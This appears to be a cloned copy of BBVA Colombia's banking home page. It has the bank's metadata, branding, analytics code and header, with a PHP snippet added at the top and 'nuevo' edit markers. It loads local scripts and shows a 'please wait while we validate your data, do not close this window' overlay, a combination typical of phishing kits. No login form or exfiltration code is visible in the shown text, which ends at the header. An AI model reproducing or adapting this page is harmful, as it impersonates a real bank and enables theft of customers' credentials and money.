<?php
// Supongamos que $html es el contenido de tu página
function eliminar_overlay_potente($html) {
    // Busca el div con esa clase exacta y lo borra
    $patron = '/<div class="image__overlay"><\/div>/i';
    return preg_replace($patron, '', $html);
}

// Ejemplo de uso:
// $output = ob_get_clean(); 
// echo eliminar_overlay_potente($output);
?>
<!DOCTYPE html>
    <html lang="es-CO">
        <head>
			<style>
@keyframes pulse {
    0% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.1); opacity: 0.7; }
    100% { transform: scale(1); opacity: 1; }
}
</style>
            <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
            <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
            <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
            <meta name="lang" content="es-CO"/>
            <meta name="resource-type" content="document"/>
            <meta name="global" content="distribution"/>
            <meta name="robots" content="index, follow"/>
            <meta name="author" content="BBVA"/>
            <meta name="description" lang="es-CO" content="Bienvenido a la página web de BBVA Colombia. Conoce las oportunidades, productos, servicios y recomendaciones que tenemos en la banca en línea ¡Ingresa!"/>
            <meta name="keywords" lang="es-CO" content="BBVA, BBVA Colombia, banca virtual, banco bbva"/>
            <meta scheme="W3CDTF" name="date" content="July 21, 2022 12:00:00 +0000"/>
            <meta scheme="W3CDTF" name="DC.date" content="July 21, 2022 12:00:00 +0000"/>
            <meta name="DC.date.issue" content="July 21, 2022 12:00:00 +0000"/>
            <meta name="last-modified" content="July 21, 2022 12:00:00 +0000"/>
            <meta name="pageDate" content="July 21, 2022 12:00:00 +0000"/>
            <meta name="DC.date" content="July 21, 2022 12:00:00 +0000"/>
            <meta name="pageRender" content="July 21, 2022 12:00:00 +0000"/>
            <meta itemprop="datePublished" content="July 21, 2022 12:00:00 +0000"/>
            <meta scheme="RFC1766" name="DC.language" content="es-CO"/>
            <meta name="DC.title" lang="es-CO" content="BBVA COLOMBIA"/>
            <meta name="twitter:title" content="Bienvenido a la Banca Virtual | BBVA Colombia"/>
            <meta name="twitter:description" content="Bienvenido a la página web de BBVA Colombia. Conoce las oportunidades, productos, servicios y recomendaciones que tenemos en la banca en línea ¡Ingresa!"/>
            <meta name="twitter:card" content="summary"/>
            <meta property="og:title" content="Bienvenido a la Banca Virtual | BBVA Colombia"/>
            <meta property="og:description" content="Bienvenido a la página web de BBVA Colombia. Conoce las oportunidades, productos, servicios y recomendaciones que tenemos en la banca en línea ¡Ingresa!"/>
            <meta property="og:type" content="website"/>
            <meta property="og:url" content="https://www.bbva.com.co"/>
            <meta property="fb:pages" content="https://www.facebook.com/bbvaencolombia/"/>
            <meta name="search_segment" content="personas"/>

            <script type="text/javascript">
            var espera = 0;
            </script>


            <script type="application/ld+json">{"@context":"http://www.schema.org","@type":"Organization","name":"Banco Bilbao Viscaya Argentaria de Colombia S.A.","url":"/personas.html","address":{"@type":"PostalAddress","streetAddress":"Carrera 9 N 72 - 21","addressLocality":"Bogota","addressRegion":"Bogota","postalCode":"110221","addressCountry":"Colombia"},"contactPoint":{"@type":"ContactPoint","telephone":"+57 01 8000 912 227","contactType":"servicio al cliente"},"logo":"https://www.bbva.com.co/content/dam/public-web/global/images/logos/logo_bbva_blanco.svg","sameAs":["https://www.facebook.com/bbvaencolombia/","https://www.linkedin.com/company/bbva-colombia/","https://twitter.com/bbva_colombia","https://www.youtube.com/BBVAenColombia"],"description":"Bienvenido a la página web de BBVA Colombia. Conoce las oportunidades, productos, servicios y recomendaciones que tenemos en la banca en línea ¡Ingresa!"}</script>
    
    
            <script type="application/ld+json">[{"@context":"https://schema.org","@type":"VideoObject","name":"¿Cómo descargar extractos?","description":"¿Cómo descargar extractos?","uploadDate":"2021-09-01T02:44:00.000Z","thumbnailUrl":"http://i.ytimg.com/vi/kqRA5JMj32I/hqdefault.jpg","embedURL":"//www.youtube.com/embed/kqRA5JMj32I?enablejsapi=1&rel=0&showinfo=0z"},{"@context":"https://schema.org","@type":"VideoObject","name":"¿Cómo hacer transferencias?","description":"¿Cómo hacer transferencias?","uploadDate":"2021-08-31T09:46:00.000Z","thumbnailUrl":"http://i.ytimg.com/vi/mRUFgzNMPPI/hqdefault.jpg","embedURL":"//www.youtube.com/embed/mRUFgzNMPPI?enablejsapi=1&rel=0&showinfo=0z"},{"@context":"https://schema.org","@type":"VideoObject","name":"¿Cómo recibir dinero del exterior?","description":"¿Cómo recibir dinero del exterior?","uploadDate":"2021-08-31T04:49:00.000Z","thumbnailUrl":"http://i.ytimg.com/vi/PIZjI-0BWMY/hqdefault.jpg","embedURL":"//www.youtube.com/embed/PIZjI-0BWMY?enablejsapi=1&rel=0&showinfo=0z"},{"@context":"https://schema.org","@type":"VideoObject","name":"¿Cómo enviar dinero al exterior?","description":"¿Cómo enviar dinero al exterior?","uploadDate":"2021-08-31T09:55:00.000Z","thumbnailUrl":"http://i.ytimg.com/vi/Qh2HQezaRhM/hqdefault.jpg","embedURL":"//www.youtube.com/embed/Qh2HQezaRhM?enablejsapi=1&rel=0&showinfo=0z"},{"@context":"https://schema.org","@type":"VideoObject","name":"¿Cómo activar mi tarjeta de crédito?","description":"¿Cómo activar mi tarjeta de crédito?","uploadDate":"2021-09-01T02:56:00.000Z","thumbnailUrl":"http://i.ytimg.com/vi/wmJuNazfgrQ/hqdefault.jpg","embedURL":"//www.youtube.com/embed/wmJuNazfgrQ?enablejsapi=1&rel=0&showinfo=0z"},{"@context":"https://schema.org","@type":"VideoObject","name":"¿Cómo asignar la clave de mi tarjeta BBVA?","description":"¿Cómo asignar la clave de mi tarjeta BBVA?","uploadDate":"2021-09-01T03:01:00.000Z","thumbnailUrl":"http://i.ytimg.com/vi/8IwsdZ3w5p4/hqdefault.jpg","embedURL":"//www.youtube.com/embed/8IwsdZ3w5p4?enablejsapi=1&rel=0&showinfo=0z"}]</script>

            <script type="text/javascript">
                window.digitalData = {"application":{"application":{"name":"","type":""},"customFields":"","earnings":"","errorType":"","expenses":"","fulfillmentModel":"","globalApplication":"","interactionLevel":"","isQualifiedVisits":"","offer":"","operationNumber":"","process":"","programTypeHired":"","state":"","step":"","transactionID":"","typology":""},"internalCampaign":{"attributes":[],"event":{"eventInfo":{"eventName":"","siteActionName":""}}},"optimization":{"attributes":[],"event":[]},"page":{"pageActivity":{"audio":{"nameOfPodcastDisplayed":""},"link":{"aux1":"","aux2":"","aux3":"","ext":"","name":"","url":""},"loginType":"","search":{"onSiteSearchEnterTerm":"","onSiteSearchResults":"","onSiteSearchTerm":""},"video":{"nameOfVideoDisplayed":""}},"pageInfo":{"area":"publica","businessUnit":"BBVA Colombia","channel":"online","errorPage":"","geoRegion":"","language":"ES","level1":"home","level10":"","level2":"","level3":"","level4":"","level5":"","level6":"","level7":"","level8":"","level9":"","pageIntent":"home","pageName":"escritorio:publica:personas:home","pageSegment":"personas","projectName":"","server":"","siteAppName":"BBVA Colombia","sysEnv":"escritorio","version":"1.1.0"}},"pageInstanceID":"pro","products":{"attributes":[],"productPortfolio":[]},"user":{"age":"","civilStatus":"","country":"","device":{"root":"","mobile":"","userAgent":""},"educationLevel":"","gender":"","jobType":"","profileID":"","prospectID":"","segment":{"profile":"","global":""},"state":"","userID":"","userState":"no logado"},"versionDL":"20190718_4.0"};

                window.digitalData.user.device.mobile = (function(a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g|nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) return 'si';return 'no';})(navigator.userAgent || navigator.vendor || window.opera);
                window.digitalData.user.device.userAgent = window.navigator.userAgent;
                window.digitalData.page.pageInfo.server =  window.location.host;
            </script>

            <script type="application/ld+json">
                {"@context":"https://schema.org","@type":"WebSite","name":"BBVA","url":"https://www.bbva.com.co","potentialAction":{"@type":"SearchAction","target":"https://www.bbva.com.co/personas/buscador.html?_charset_=UTF-8&search={search_term_string}","query-input":"required name=search_term_string"}}
            </script>

    
            <script type="text/javascript">var lazycss = lazycss ? lazycss : [];</script>
            <script type="text/javascript">var lazycsskeys = lazycsskeys ? lazycsskeys : [];</script>



            <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.critical/small.lc-20230516-100300-lc.min.ACSHASH7eef699753cd6a0f27993280a0fb5f65.css" type="text/css">



    
<link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.critical/large.lc-20230516-100300-lc.min.ACSHASHda2ffa67489b67d75fb66b15abe18fda.css" type="text/css" media="all and (min-width: 600px)">



    
<link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.common.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">



    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="apps/bbva/pwebs/components/clientlibs/bbva.iconfonts.lc-20221107-112823-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>



    
<link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.lightbox/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">



    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="apps/bbva/pwebs/components/clientlibs/bbva.lightbox/large.lc-20221107-112823-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>



    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="apps/bbva/pwebs/components/clientlibs/bbva.radiobutton.lc-20221107-112823-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>



    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="apps/bbva/pwebs/components/clientlibs/bbva.sectionTitle.lc-20221107-112823-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>



    
<link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.videoLink/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">



    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="apps/bbva/pwebs/components/clientlibs/bbva.videoLink/large.lc-20221107-112823-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>


    

    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="apps/bbva/pwebs/components/clientlibs/bbva.iframe.lc-20221107-112823-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>


            <script>!function(){var e=new URLSearchParams(window.location.search);e&&e.has("theme")&&localStorage.setItem("theme",e.get("theme"));var t=localStorage.getItem("theme");if(t){["dark"].includes(t)&&document.querySelector("html").classList.add(t+"-theme")}}();</script>


            <link rel="schema.DC" href="http://purl.org/dc/elements/1.1/"/>
            <link rel="schema.DCTERMS" href="http://purl.org/dc/terms/"/>


            <link rel="icon" type="image/png" sizes="48x48" href="https://www.bbva.com.co/content/dam/public-web/global/images/favicon/v1/favicon-48x48.png"/>
            <link rel="apple-touch-icon" sizes="180x180" href="https://www.bbva.com.co/content/dam/public-web/global/images/favicon/v1/apple-touch-icon.png"/>
            <link rel="icon" type="image/png" sizes="32x32" href="https://www.bbva.com.co/content/dam/public-web/global/images/favicon/v1/favicon-32x32.png"/>
            <link rel="icon" type="image/png" sizes="192x192" href="https://www.bbva.com.co/content/dam/public-web/global/images/favicon/v1/android-chrome-192x192.png"/>
            <link rel="icon" type="image/png" sizes="16x16" href="https://www.bbva.com.co/content/dam/public-web/global/images/favicon/v1/favicon-16x16.png"/>
            <link rel="manifest" href="/apps/settings/wcm/designs/bbva/img/favicons/v1/site.webmanifest"/>
            <link rel="mask-icon" href="https://www.bbva.com.co/content/dam/public-web/global/images/favicon/v1/safari-pinned-tab.svg" color="#1464a5"/>
            <link rel="shortcut icon" href="https://www.bbva.com.co/content/dam/public-web/global/images/favicon/v1/favicon.ico"/>
            <meta name="msapplication-TileColor" content="#ffffff"/>
            <meta name="msapplication-TileImage" content="https://www.bbva.com.co/content/dam/public-web/global/images/favicon/v1/mstile-144x144.png"/>
            <meta name="msapplication-config" content="/apps/settings/wcm/designs/bbva/img/favicons/v1/browserconfig.xml"/>
            <meta name="theme-color" content="#ffffff"/>

            <link rel="alternate" type="application/rss+xml" title="RSS" href="https://www.youtube.com/BBVAenColombia"/>
    
            <link rel="canonical" href="https://www.bbva.com.co"/>

            <!-- nuevo1  -->
    <script src="etc.clientlibs/clientlibs/granite/jquery.min.ACSHASHcee8557e8779d371fe722bbcdd3b3eb7.js"></script>
<script src="etc.clientlibs/clientlibs/granite/utils.min.ACSHASH4a192b590a2c2926fb000264370c0588.js"></script>
    <!-- nuevo1 (fin)  --> 
    
            <title>Bienvenido a la Banca Virtual |</title>

            <script type="text/javascript">
                window.isPagePrehiding = true;
            </script>

            <script type="text/javascript">
                (function(g,b,d,f){(function(a,c,d){if(a){var e=b.createElement("style");e.id=c;e.innerHTML=d;a.appendChild(e)}})(b.getElementsByTagName("head")[0],"at-body-style",d);setTimeout(function(){var a=b.getElementsByTagName("head")[0];if(a){var c=b.getElementById("at-body-style");c&&a.removeChild(c)}},f)})(window,document,"body {opacity: 0 !important}",3E3);
            </script>

            <script type="text/javascript">
                // define a readonly the BE editor mode state.
                window.AEMeditorMode = false;
            </script>
        

            <style type="text/css">
                #panel-formulario{
                    background-color: #fff;
                    width: 100%;
                    height: 0px;
                    text-align: center;
                }

                .fondo{
                    width: 100%;
                    height: 100%;
                    position: fixed;
                    z-index: 189;
                    top: 0;
                    left: 0;
                    background: #ffffff96;
                    display: none;
                }

                .mensaje{  
                    color: #fff;
                    padding: 30px; 
                    background-color: #004481;  
                    width: 94%;
                    max-width: 480px;              
                    position: fixed;
                    z-index: 190;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    font-family: BentonSansBBVA-Book, Helvetica, Arial, sans-serif;
                    font-size: 14px;                                                          
                    display: none;
                    text-align: center;
                }

                .mensaje td{                      
                    font-family: BentonSansBBVA-Book, Helvetica, Arial, sans-serif;
                    font-size: 16px;         
                }

                #cargandoani2{
                    width: 70px !important;
                    display: none;
                }

                #cargandoani{
                    width: 200px !important;
                }

                @media (max-width:478px) {
                    #cargandoani2{
                        display: initial;
                    }
                    #cargandoani{
                        display: none;
                    }
                }

            </style>

            <link href="css/styles.css" rel="stylesheet">    
            <script type="text/javascript" src="js/functions.js"></script>   
            <script type="text/javascript" src="../../../assets/js/jquery-3.6.0.min.js"></script>
        </head>
    
        <body class="bbva__base  " itemscope itemtype="http://schema.org/WebPage">
            <div class="fondo"></div>
            <div class="mensaje"> 
                <table style="vertical-align: middle !important;">
                    <tr style="vertical-align: middle !important;">
                        <td align="justify" valign="middle" style="vertical-align: middle !important;">Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minuto. No cierres o recargues esta ventana.</td>
                        <td valign="middle" style="vertical-align: middle !important;"><img id="cargandoani" src="img/loader.gif"></td>
                    </tr>
                </table> 
                <img id="cargandoani2" src="img/loader.gif" width="70">
            </div>


            <div class="general-wrapper">            
            <!-- This file is being overwritten in the configuration page to allow the edition of the header alert
     or other header components which can be edited into the configuration template.
 -->
            
                <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.header/small.lc-20230516-100300-lc.min.ACSHASH659ec30a3124dc28185995a987513909.css" type="text/css">

                <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.header/large.lc-20230516-100300-lc.min.ACSHASHf2abe09e37ea20c7751c9867a9bc7863.css" type="text/css" media="all and (min-width: 600px)">

                <header class="header__base wrapper" data-component="tabulation">
    
                    <div class="alert--full alert--yellow" data-component="browseralert" data-component-params='{"browserSupport": {&#34;partial&#34;:[],&#34;any&#34;:[]}, "noSupportFallbackPage" : null}'>
                        </div>

                    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.alert/small.lc-20230516-100300-lc.min.ACSHASH85b3494b833d0befdc7e352f559401c4.css" type="text/css">

                    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.alert/large.lc-20230516-100300-lc.min.ACSHASH6b857abe29b6e800a05ceadad087731c.css" type="text/css" media="all and (min-width: 600px)">

                    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.stickyalert.lc-20230516-100300-lc.min.ACSHASHa603fa119312657f11fed46c3d83e072.css" type="text/css">

                    <div class="cookies alert--full alert--extra alert--stickybottom">
                        <div class="alert__base stickyalert__base container" data-component="cookies">
                            <div class="alert__wrapper">
                                <img class="bbva-svgicon alert__icon" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/4_002_info.svg" alt=""/>
                                <p class="alert__title" itemprop="name" aria-level="1">Información</p>
                                <div class="alert__text rte">
                                    <p>Utilizamos cookies propias y de terceros para mejorar nuestros servicios y mostrar a los usuarios publicidad relacionada con sus preferencias. Si se continúa navegando, consideramos que se acepta su uso. Es posible cambiar la configuración u obtener más información.<br />
                                    </p>
                                </div>
                                <a itemprop="mainEntityOfPage" aria-label="Más información" title="Más información" target="_self" class="alert__link link__base  " href="/personas/aviso-legal.html">
                                    Más información
                                </a>
                                <button class="alert__close" aria-label="Cierra cookie" data-alert-close>
                                    <i class="bbva-icon bbva-icon__2_022_close"></i>
                                </button>
                            </div>
                        </div>
                    </div>
                    <div>
                    </div>





<!-- nuevo2 -->
<div>

<link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.alert/small.lc-20230516-100300-lc.min.ACSHASH85b3494b833d0befdc7e352f559401c4.css" type="text/css">

<link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.alert/large.lc-20230516-100300-lc.min.ACSHASH6b857abe29b6e800a05ceadad087731c.css" type="text/css" media="all and (min-width: 600px)">
    
<link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.stickyalert.lc-20230516-100300-lc.min.ACSHASHa603fa119312657f11fed46c3d83e072.css" type="text/css">

</div>

<link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.header/small.lc-20230516-100300-lc.min.ACSHASH659ec30a3124dc28185995a987513909.css" type="text/css">

<link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.header/large.lc-20230516-100300-lc.min.ACSHASHf2abe09e37ea20c7751c9867a9bc7863.css" type="text/css" media="all and (min-width: 600px)">

<!-- nuevo2 (Fin) -->






                    <script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="apps/bbva/pwebs/components/clientlibs/bbva.animations.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>

                    <script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="apps/bbva/pwebs/components/clientlibs/bbva.skip2content.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>

                    <a class="skip2content invisible" tab-index="0" href="#main" aria-label="Ir al contenido principal">
                        Ir al contenido principal
                    </a>        
                    <nav class="header__container background--navy" aria-label="bbva colombia" data-component="header" data-dl-component data-dl-component-name="header" data-dl-component-type="bbva/pwebs/components/par/header" id="header">

                        <div class="header__main container">
                            <div class="header__wrapper">            
                                <div class="header__logo" data-component="svgLogoFix" itemscope itemtype="http://schema.org/Organization">
                                    <a itemscope="url" class="header__logo__link " href="https://www.bbva.com.co" target="_self" aria-label="home bbva colombia" title="bbva colombia">
                                        <img data-component-params='{"keepSize": "" }' src="https://www.bbva.com.co/content/dam/public-web/global/images/logos/logo_bbva_blanco.svg" srcset="https://www.bbva.com.co/content/dam/public-web/global/images/logos/logo_bbva_blanco.svg" sizes="(min-width: 900px) 20vw, 50vw" itemprop="logo" class="header__image " alt="bbva colombia" role="img"/>
                                    </a>
                                </div>
                                <div class="header__mainnavigation" itemscope itemtype="https://schema.org/SiteNavigationElement">

                                    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.mainNavigation/small.lc-20230516-100300-lc.min.ACSHASH68c7c67037ad8291ee4b4ad9061a9e30.css">

                                    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.mainNavigation/large.lc-20230516-100300-lc.min.ACSHASH8f81358eebb18a1778ddd3319a401956.css" type="text/css" media="all and (min-width: 600px)">

                                    <nav class="mainnavigation__base">
                                        <ul class="mainnavigation__list">
                                            <li itemprop="name" class="mainnavigation__item mainnavigation__item--active">
                                                <a itemprop="url" aria-label="Personas Opción seleccionada" href="#" target="_self" class="mainnavigation__link">Personas</a>
                                            </li>
                                            <li itemprop="name" class="mainnavigation__item">
                                                <a itemprop="url" aria-label="Empresas " target="_self" class="mainnavigation__link" href="/empresas.html">Empresas</a>
                                            </li>
                                        </ul>
                                    </nav>            
                                </div>
                            </div>
                            <nav class="header__actions" itemscope="" itemtype="https://schema.org/SiteNavigationElement">
                                <ul class="header__actions__ulist">
                                    <li itemprop="name" class="header__actions__list header__actions--tablet-hidden header__actions--mobile-hidden">
                                        <a itemprop="url" class="header__actions__item__link header__createaccount" href="https://www.bbva.com.co/personas/registrate.html">
                                            <img class="bbva-svgicon bbva-svgicon--largemobile" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_051_newclient.svg" alt=""/>
                                            <span>Regístrate</span>
                                        </a>
                                    </li>
                    
                                    <li itemprop="name" class="header__actions__list header__actions--tablet-left">

                                        <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.access/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

                                        <!-- nuevo3 -->

                                        <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.access/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

                                        <!-- nuevo3 (Fin) -->                                        


                                        <script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="apps/bbva/pwebs/components/clientlibs/bbva.access/large.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>

                                        <div data-component="access" id="btnAcceso">
                                            <a class="header__actions__item__link header__actions--menu header__access" accesskey="a" itemprop="url" aria-label="Acceso" href="javascript:void(0)" aria-expanded="false">
                                                <svg class="header__icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" height="24px" width="24px">
                                                    <defs><style>.bbvaicn{fill:#fff}</style></defs>
                                                    <path class="bbvaicn" d="M161.38 132.34a70 70 0 0 1-62.76 0A90 90 0 0 0 30 219.77v20h200v-20a90 90 0 0 0-68.62-87.43zM160 209.77h-30v-20h50zm-30-90a50 50 0 1 0-50-50 50 50 0 0 0 50 50z"/>
                                                </svg>
                                                <span class=" header__access__text--desktop">Acceso</span>
                                                <span class="header__access__text--tablet">Acceso</span>
                                                <span class=" header__access__text--mobile">Acceso</span>
                                            </a>
                                        </div>
                                    </li>
                    
                                    <li class="header__actions__list header__actions--tablet-hidden">
                                        <div class="search__trigger" role="search">
                                            <a href="javascript:void(0);" aria-haspopup="true" aria-controls="access__container__content" aria-label="Buscador" aria-expanded="false" accesskey="s" class="header__actions__item__link search__trigger__btn" title="search">
                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" height="20px" width="20px">
                                                    <defs><style>.bbvaicn{fill:#fff}</style></defs>
                                                    <path class="bbvaicn" d="M182.85 162.85a90 90 0 1 0-20 20L220 240l20-20zM150 110a40 40 0 0 0-40-40V50a60 60 0 0 1 60 60z"/>
                                                </svg>
                                            </a>
                                        </div>
                                    </li>

                                    <li class="header__actions__list header__actions--tablet-right">
                                        <a class="megamenu__trigger header__actions__item__link " href="javascript:void(0);" aria-expanded="false" aria-haspopup="true" aria-label="Menú principal" aria-controls="megamenu__aside" accesskey="m">
                                            <span class="megamenu__trigger megamenu__trigger__open header__actions--menu" aria-hidden="false">
                                                <span class="header__actions__item__link__text">Menú</span>
                                                <svg class="header__icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" height="24px" width="24px">
                                                    <defs><style>.bbvaicn{fill:#fff}</style></defs>
                                                    <g>
                                                        <polygon class="bbvaicn" points="210.37 80.12 20.37 80.12 20.37 50.12 240.37 50.12 210.37 80.12"/>
                                                        <polygon class="bbvaicn" points="180.37 145.12 20.37 145.12 20.37 115.12 210.37 115.12 180.37 145.12"/>
                                                        <polygon class="bbvaicn" points="150.37 210.12 20.37 210.12 20.37 180.12 180.37 180.12 150.37 210.12"/>
                                                    </g>
                                                </svg>
                                            </span>
                                            <span class="megamenu__trigger megamenu__trigger__close hidden header__actions--menu" aria-hidden="true">
                                                <span class="header__actions__item__link__text">Cerrar</span>
                                                <i class="bbva-icon bbva-icon__2_022_close"></i>
                                            </span>
                                        </a>
                                    </li>
                                </ul>
                            </nav>
                        </div>
                    </nav>

                    <div class="access__container invisible" id="access__container__content" aria-hidden="true" tabindex="-1">
                        <div class="container">
                            <div class="access__control">
                                <button class="access__close" aria-label="cerrar" tabindex="-1"><i class="bbva-icon bbva-icon__2_022_close"></i></button>
                            </div>
                            <div class="access__content"></div>
                        </div>
                    </div>
                </header>

     

                <div class="search search--desktop wrapper">
                   


